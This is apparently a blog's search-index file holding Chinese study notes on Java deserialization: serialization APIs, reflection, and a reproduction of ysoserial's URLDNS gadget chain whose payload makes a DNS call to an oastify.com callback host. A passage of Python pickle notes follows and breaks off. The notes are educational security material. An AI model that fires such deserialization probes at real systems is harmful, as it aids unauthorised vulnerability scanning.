<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/01/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/01/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="基本知识"><a class="markdownIt-Anchor" href="#基本知识"></a> 基本知识</h1><h2 id="jdk类库中的序列化api"><a class="markdownIt-Anchor" href="#jdk类库中的序列化api"></a> JDK类库中的序列化API</h2><h3 id="javaioobjectoutputstream"><a class="markdownIt-Anchor" href="#javaioobjectoutputstream"></a> Java.io.ObjectOutputStream</h3><p>Java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p><h3 id="javaioobjectinputstream"><a class="markdownIt-Anchor" href="#javaioobjectinputstream"></a> Java.io.ObjectInputStream</h3><p>Java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p><h3 id="serializable接口"><a class="markdownIt-Anchor" href="#serializable接口"></a> Serializable接口</h3><p>只有实现了Serializable和Externalizable接口的类的对象才能被序列化。只需要声明该接口，不需要实现。Externalizable接口继承自Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以采用默认的序列化方式 。</p><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><h3 id="demo"><a class="markdownIt-Anchor" href="#demo"></a> demo</h3><p>IDEA新建项目<img src="https://cdn.nlark.com/yuque/0/2022/png/2597389/1671703164146-10f63424-d4f3-4acb-9fea-75c81268e29b.png#averageHue=%233d4144&amp;clientId=u7db828f6-9b14-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=610&amp;id=uc10622a6&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1068&amp;originWidth=1380&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=91025&amp;status=done&amp;style=none&amp;taskId=ucdc6ae09-6e04-43a8-86a8-29ff2191ca0&amp;title=&amp;width=788.5714285714286" alt="image.png" />IDEA运行配置：<img src="https://cdn.nlark.com/yuque/0/2022/png/2597389/1671703328382-934f2900-20c1-4748-8d20-2a048408d2f7.png#averageHue=%233d4043&amp;clientId=u7db828f6-9b14-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=677&amp;id=u06392d09&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1185&amp;originWidth=1831&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=99599&amp;status=done&amp;style=none&amp;taskId=ud80053ef-d29e-4246-9bf0-fbfc1fe3b22&amp;title=&amp;width=1046.2857142857142" alt="image.png" />选择应用程序以及执行主类（即有main函数java文件），然后添加文件如下所示：目录结构：├─src├─main├─java└─org└─exampleEmployee.javaJavaSerializ.javaMain.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mailCheck</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;,&quot;</span> + address);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//重写序列化和反序列化接口</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;writeExternal&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;writeExternal&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaSerializ</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line">        e.name = <span class="string">&quot;username&quot;</span>;</span><br><span class="line">        e.address = <span class="string">&quot;xxxx xxxxx xxxxx&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./data.obj&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">            out.writeObject(e);</span><br><span class="line">            out.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.print(<span class="string">&quot;./data.obj&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(IOException ex)</span><br><span class="line">        &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./data.obj&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">            <span class="type">Employee</span> <span class="variable">exp</span> <span class="operator">=</span> (Employee) in.readObject();</span><br><span class="line">            in.close();</span><br><span class="line">            System.out.println(exp.name);</span><br><span class="line">            System.out.println(exp.address);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择主类JavaSerializ编译并运行，在根目录下生成data.obj文件，为Employee类实例化对象e的序列化字节流。使用Java 序列化流和 Java RMI 数据包内容分析工具<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a>查看data.obj数据的结构：<code>java -jar SerializationDumper-v1.13.jar -r data.obj</code></p><p>| STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05ContentsTC_OBJECT - 0x73TC_CLASSDESC - 0x72classNameLength - 20 - 0x00 14Value - org.example.Employee - 0x6f72672e6578616d706c652e456d706c6f796565serialVersionUID - 0xe1 fa 76 a5 ca 8c f8 2bnewHandle 0x00 7e 00 00classDescFlags - 0x02 - SC_SERIALIZABLEfieldCount - 2 - 0x00 02Fields0:Object - L - 0x4cfieldNameLength - 7 - 0x00 07Value - address - 0x61646472657373className1TC_STRING - 0x74newHandle 0x00 7e 00 01Length - 18 - 0x00 12Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b1:Object - L - 0x4cfieldNameLength - 4 - 0x00 04Value - name - 0x6e616d65className1TC_REFERENCE - 0x71Handle - 8257537 - 0x00 7e 00 01TC_STRING - 0x74newHandle 0x00 7e 00 03Length - 16 - 0x00 10Value - xxxx xxxxx xxxxx - 0x78787878207878787878207878787878 || --- |</p><h2 id="反序列化漏洞的产生"><a class="markdownIt-Anchor" href="#反序列化漏洞的产生"></a> 反序列化漏洞的产生</h2><ol><li>入口类的readObject直接调用危险方法</li><li>人口类参数中包含可控类，该类有危险方法，readObject时调用</li><li>入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用</li><li>构造函数、静态代码块等类加载时隐形执行</li></ol><p>其他条件</p><ol><li>继承Serializable接口，可序列化</li><li>入口类（source）重写readObject，参数类型宽泛，最好是jdk自带，例如hashmap、hashtable</li><li>调用链（gadget chain）同名函数</li><li>执行类（sink）</li></ol><h1 id="java的反射机制"><a class="markdownIt-Anchor" href="#java的反射机制"></a> Java的反射机制</h1><p>先获取一个类的原型，再通过原型映射出其他东西反射的作用：让Java具有动态性</p><ul><li>修改已有对象的属性</li><li>动态生成对象</li><li>动态调用方法</li><li>操作内部类和私有方法</li></ul><p>在反序列化漏洞中的应用：</p><ul><li>定制需要的对象</li><li>通过invoke调用除了同名函数以外的函数</li><li>用过Class类创建对象，引入不能序列化的类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> e.getClass();<span class="comment">// 反射就是操作class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class中实例化对象</span></span><br><span class="line"><span class="comment">//        c.newInstance();</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">employeeconstructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        Employee ee=(Employee) employeeconstructor.newInstance(<span class="string">&quot;asd&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(ee);</span><br><span class="line">        <span class="comment">//获取类中属性</span></span><br><span class="line">        Field[] employeefields = c.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f:employeefields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>); <span class="comment">// 私有属性可访问</span></span><br><span class="line">        namefield.set(ee,<span class="string">&quot;zxc&quot;</span>);</span><br><span class="line">        System.out.println(ee);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用类中方法</span></span><br><span class="line">        Method[] employeemethods=c.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method m:employeemethods)&#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        Method employeemethod=c.getDeclaredMethod(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        employeemethod.invoke(ee);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="尝试一下urldns调用链"><a class="markdownIt-Anchor" href="#尝试一下urldns调用链"></a> 尝试一下URLDNS调用链</h1><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a>以ysoserial的URLDNS调用链为例（Gadget Chain）：</p><ul><li>HashMap.readObject()<ul><li>HashMap.putVal()<ul><li>HashMap.hash()<ul><li>URL.hashCode()</li></ul></li></ul></li></ul></li></ul><p>入口类是HashMap，putVal()放入一个键值对时调用URL对象的计算hash方法URL.hashCode()中发起请求。<img src="https://cdn.nlark.com/yuque/0/2023/png/2597389/1672985012236-f52fe549-2830-46f1-9bb6-9bd4f9d67d3b.png#averageHue=%232d2c2b&amp;clientId=u8d2cee76-7b91-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=291&amp;id=u04262642&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=509&amp;originWidth=1308&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=96048&amp;status=done&amp;style=none&amp;taskId=ucef9ffb7-1338-423b-b530-ba39ba8a54c&amp;title=&amp;width=747.4285714285714" alt="image.png" />hashmap的put方法调用hash()方法<img src="https://cdn.nlark.com/yuque/0/2023/png/2597389/1672985033054-ee8b5299-66cc-4ed2-b3c5-ee6ad75a3154.png#averageHue=%232f2e2d&amp;clientId=u8d2cee76-7b91-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=92&amp;id=u8a537600&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=161&amp;originWidth=1096&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=19523&amp;status=done&amp;style=none&amp;taskId=u001335b3-0417-414d-b0f3-b13974299bf&amp;title=&amp;width=626.2857142857143" alt="image.png" />hash方法会返回对象的hashcode<img src="https://cdn.nlark.com/yuque/0/2023/png/2597389/1672985089122-2ba98842-c7db-4514-ac45-3db2481f4fae.png#averageHue=%232e2d2c&amp;clientId=u8d2cee76-7b91-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=118&amp;id=ue819c847&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=206&amp;originWidth=1018&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=20159&amp;status=done&amp;style=none&amp;taskId=u8aea7de1-c664-41fa-9ddf-2b01e3426e0&amp;title=&amp;width=581.7142857142857" alt="image.png" />若url对象的hashCode为-1时，会调用handler.hashCode()方法<img src="https://cdn.nlark.com/yuque/0/2023/png/2597389/1672914167849-cf011407-89a1-44c3-bba3-4f37c9f041f1.png#averageHue=%232d2c2b&amp;clientId=u04d316d3-6b11-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=162&amp;id=u047564ca&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=203&amp;originWidth=604&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=19929&amp;status=done&amp;style=none&amp;taskId=u5d024f23-893c-4bf4-80ec-49af40b4005&amp;title=&amp;width=483.2" alt="image.png" />handler.hashCode()方法会在getHostAddress(u)这里产生一个dns请求<img src="https://cdn.nlark.com/yuque/0/2023/png/2597389/1672985253357-1f9b4b26-80ae-4667-af87-34fb2a0d5153.png#averageHue=%232d2c2b&amp;clientId=u8d2cee76-7b91-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=474&amp;id=u0df26c18&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=829&amp;originWidth=883&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=74503&amp;status=done&amp;style=none&amp;taskId=ub05a4355-7f03-44c5-aa7f-4540ec038b8&amp;title=&amp;width=504.57142857142856" alt="image.png" />但序列化的过程中会产生一个问题：<code>hashmap.put(url,1);</code>这一步对象url的hashcode会被计算出来，不为-1，那么在其反序列化时不会调用handler.hashCode()方法，所以需要使用反射修改对象的私有属性hashCode。代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./data.obj&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">            out.writeObject(obj);</span><br><span class="line">            out.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.print(<span class="string">&quot;./data.obj&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(IOException ex)</span><br><span class="line">        &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://p5vw6gy7y7h458eoewi909g0erkh86.oastify.com&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射，改变已有对象（url）的属性</span></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">URL</span>&gt; c = url.getClass();</span><br><span class="line">        <span class="comment">// hashCode为其私有属性</span></span><br><span class="line">        Field hashCodeField=c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置hashCode属性可访问</span></span><br><span class="line">        hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCodeField.set(url,<span class="number">123</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 修改hashCode为-1，使其反序列化时成功调用handle.hashCode()</span></span><br><span class="line">        hashCodeField.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unseriasize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./data.obj&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">            HashMap&lt;URL,Integer&gt; exp = (HashMap&lt;URL,Integer&gt;) in.readObject();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Unseriasize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ps：如果报java.lang.reflect.InaccessibleObjectExceptionIDEA-&gt;运行-&gt;编辑设置-&gt;修改选项-&gt;添加vm选项-&gt;在出现的框框中填<code>--add-opens java.base/java.net=ALL-UNNAMED</code></p><h1 id="最后最后"><a class="markdownIt-Anchor" href="#最后最后"></a> 最后最后</h1><p>参考的东西挺杂的，这儿看一点那儿看一点，主要是根据和学校实训时候的视频学的，Java基础是跟着学的。Java真复杂，估计还得写好几篇小记。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python反序列化 学习小记</title>
      <link href="/2022/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/"/>
      <url>/2022/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>夏季小学期，奇安信老师的反序列化系列课程回顾笔记</p></blockquote> <span id="more"></span><h1 id="序列化概念"><a class="markdownIt-Anchor" href="#序列化概念"></a> 序列化概念</h1><p>序列化：对象-&gt;二进制数据反序列化：二进制数据-&gt;对象目的：数据持久化</p><p>序列化特点：</p><ul><li>序列化不会保存对象方法信息</li><li>通过调用序列化函数</li><li>不同的编码方式，不同的序列化方案</li><li>本质上是保存类名和属性</li><li></li></ul><p>反序列化特点：</p><ul><li>命名空间需要有被反序列化的类，该类须有反序列化方法</li><li>需要反序列化函数</li><li>反序列化需要与序列化的编码方式对应</li><li>本质是实例化对应类的对象，给对象添加相应属性</li></ul><h1 id="python-序列化"><a class="markdownIt-Anchor" href="#python-序列化"></a> python 序列化</h1><h2 id="demo"><a class="markdownIt-Anchor" href="#demo"></a> demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;demo1&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo2</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;demo2&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo3</span>:</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    age = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;demo3&#x27;</span>, age=<span class="number">20</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name, self.age)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pickle.dumps将对象序列化</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]序列化&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo()))</span><br><span class="line"><span 